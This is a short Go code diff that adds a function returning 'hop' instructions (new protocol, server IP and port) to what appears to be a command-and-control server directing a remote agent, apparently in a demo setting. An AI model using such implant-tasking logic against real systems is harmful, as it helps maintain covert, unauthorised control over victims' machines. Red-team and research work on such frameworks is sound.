@@ -8,6 +8,7 @@ import (
 	"log"
 	"math/rand"
 	"net/http"
+	"numinon_shadow/internal/agent/config"
 	"numinon_shadow/internal/models"
 	"os"
 	"time"
@@ -140,4 +141,23 @@ func returnMorphStruct(w http.ResponseWriter) []byte {
 		return nil
 	}
 	return morphArgsJSON
+}
+
+// for the demo we'll do same IP, new IP and PORT
+func returnHopStruct(w http.ResponseWriter) []byte {
+
+	hopArguments := models.HopArgs{
+		NewProtocol:   config.HTTP2TLS,
+		NewServerIP:   "192.168.2.249",
+		NewServerPort: "9999",
+	}
+	
+	hopArgsJSON, err := json.Marshal(hopArguments)
+
+	if err != nil {
+		log.Printf("Failed to marshal hop args: %v", err)
+		http.Error(w, "Internal server error", http.StatusInternalServerError)
+		return nil
+	}
+	return hopArgsJSON
 }
